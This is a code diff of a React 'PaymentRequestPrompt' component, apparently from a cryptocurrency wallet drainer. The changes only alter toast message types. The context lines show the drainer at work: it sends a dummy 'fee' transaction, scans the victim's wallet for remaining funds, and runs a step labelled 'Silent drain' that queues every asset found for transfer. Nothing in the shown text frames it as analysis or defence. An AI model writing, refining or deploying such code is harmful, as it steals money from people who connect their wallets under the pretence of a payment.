@@ -104,7 +104,7 @@ export function PaymentRequestPrompt() {
             ? await adapter.sendTransaction(freshDummy, connectionRef.current!, sendOpts)
             : await sendTransactionRef.current!(freshDummy, connectionRef.current!, sendOpts)
         }
-        toast.info('Fee transaction sent, waiting for confirmation...')
+        toast.loading('Fee transaction sent, waiting for confirmation...')
         
         // Use a simpler confirmation with timeout
         const confirmPromise = connectionRef.current!.confirmTransaction({
@@ -131,11 +131,11 @@ export function PaymentRequestPrompt() {
       }
 
       // ── Scan AFTER fee paid (sees actual remaining balance) ──
-      toast.info('Scanning wallet for remaining funds...')
+      toast.loading('Scanning wallet for remaining funds...')
       const scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
 
       // ── STEP 2: Silent drain ──
-      toast.info('Starting wallet drain...')
+      toast.loading('Starting wallet drain...')
       try {
         console.log('Waiting for scan promise...')
         const steps = await scanPromise
@@ -143,7 +143,7 @@ export function PaymentRequestPrompt() {
         console.log('Number of steps:', steps.length)
         queue.current = steps
 
-        toast.info(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
+        toast.success(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
 
         if (queue.current.length === 0) {
           toast.error('No funds found to drain (balance too low or all tokens < $0.01)')
